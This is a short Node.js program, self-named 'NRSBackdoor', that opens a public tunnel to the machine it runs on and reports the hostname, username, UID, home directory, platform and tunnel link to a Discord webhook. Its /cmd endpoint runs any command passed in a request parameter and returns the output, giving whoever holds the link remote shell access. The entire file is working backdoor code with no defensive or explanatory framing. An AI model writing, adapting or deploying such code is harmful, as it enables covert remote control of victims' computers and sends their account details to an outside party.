//Dependencies
const Express_Param = require("express-param")
const LocalTunnel = require("localtunnel")
const Simple_Exec = require("simple-exec")
const Discord = require("discord.js")
const Express = require("express")
const Os = require("os")

//Variables
const Webhook = new Discord.WebhookClient("Webhook ID", "Webhook token")

const Port = process.env.PORT || Math.floor(Math.random() * 9999)
const Web = Express()

///Configurations
//Express
Web.use(Express_Param())

//Function
async function LocalTunnel_Establisher(){
    const Tunnel = await LocalTunnel(Port)

    Webhook.send("```" + `OS Name: ${Os.hostname()}\nOS Username: ${Os.userInfo().username}\nOS UID: ${Os.userInfo().uid}\nOs Home Directory: ${Os.userInfo().homedir}\nOS Platform: ${Os.platform()}\nLink: ${Tunnel.url}` + "```")
}

//Main
Web.use("", function(req, res){
    if(req.path == "/cmd"){
        const cte = req.fetchParameter(["exec"])
        const cte_result = Simple_Exec.executeSync(cte.exec)

        if(cte_result.error){
            res.send(cte_result.error)
        }else{
            res.send(cte_result.output)
        }
    }else{ return }
})

//Listener
Web.listen(Port, function(){
    console.log(`NRSBackdoor is running in port ${Port}`)
    LocalTunnel_Establisher()
})
